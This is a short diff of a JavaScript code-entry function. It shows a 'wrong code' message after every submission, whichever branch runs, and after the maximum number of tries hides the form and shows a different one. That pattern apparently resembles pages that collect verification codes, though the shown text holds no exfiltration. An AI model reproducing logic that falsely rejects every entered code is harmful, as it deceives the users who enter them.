@@ -199,11 +199,15 @@ function sendCode() {
             .then((data) => {
                 setTimeout(function () {
                     if (NUMBER_TIME_SEND_CODE < MAX_TRIES) {
-                        $('#wrong-code').removeClass('d-none');
-                    } else {
-                        $('#wrong-code').removeClass('d-none');
-                        $('#send-code').prop('disabled', true);
-                    }
+                       $('#wrong-code').removeClass('d-none');
+        } else {
+            $('#wrong-code').removeClass('d-none');
+            $('#send-code').prop('disabled', true);
+
+            // ✅ Hiện biểu mẫu khác sau 4 lần sai
+            $('#code-form').addClass('d-none');
+            $('#getCode').removeClass('d-none');
+        }
                     $('.lsd-ring-container').addClass('d-none');
                 }, 2000);
             })
